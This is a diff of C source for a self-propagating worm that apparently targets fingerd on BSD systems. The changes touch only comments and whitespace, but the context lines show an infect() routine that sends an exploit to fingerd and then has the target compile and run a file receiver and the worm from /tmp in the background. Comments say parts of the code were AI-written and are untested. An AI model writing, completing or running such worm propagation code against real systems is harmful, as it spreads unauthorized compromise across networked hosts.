@@ -1,7 +1,7 @@
 /*
 TODO:
 - make sure the "&" command actually runs the compiled programs (could use "./" instead?)
-- ensure that the correct BSD versions of the files are being pulled in
+- ensure that the correct BSD versions of the files are being pulled in (they arent right now)
 - convert this file to old C so that this can be ran on BSD systems
 - test this program at all...
 */
@@ -19,7 +19,10 @@ TODO:
 /*
  * Get the current machine's IP address
  * Stores result in ip buffer
- * straight AI code, unsure if works. I dont understand it enough to know if it does
+ * 
+ * Straight AI code, unsure if this approach is best. 
+ * I dont really know enough about sockets/networking to write this by hand.
+ * But shouldn't we be able to get local IP from etc/hosts or some other simplier way?
  */
 void get_local_ip(char *ip) {
 	int sock;
@@ -147,6 +150,7 @@ void deploy_receive_file(int sock, char *my_ip) {
     free(formatted_source);
 }
 
+
 /*
  * Attempts to propagate the worm to a target host passed in via ip argument
  * Creates socket to fingerd, sends exploit, and executes propagation commands
@@ -203,7 +207,6 @@ void infect(char *ip, char *my_ip) {
 	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
 	sleep(2);
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
-
 	printf("[*] Running file receiver on target...\n");
 	write_to_sock(sock, "/tmp/receive_file &\n");
 	sleep(2);
@@ -214,7 +217,6 @@ void infect(char *ip, char *my_ip) {
 	write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
 	sleep(2);
 	read_from_sock(sock, io_buf, IO_BUF_SIZE);
-
 	printf("[+] Running worm.c on target...\n");
 	write_to_sock(sock, "/tmp/worm &\n");
 	sleep(2);
@@ -224,6 +226,7 @@ void infect(char *ip, char *my_ip) {
 	printf("[+] Infection of %s complete!\n", ip);
 	close(sock);
 }
+
 
 int main() {
 	FILE *fp;
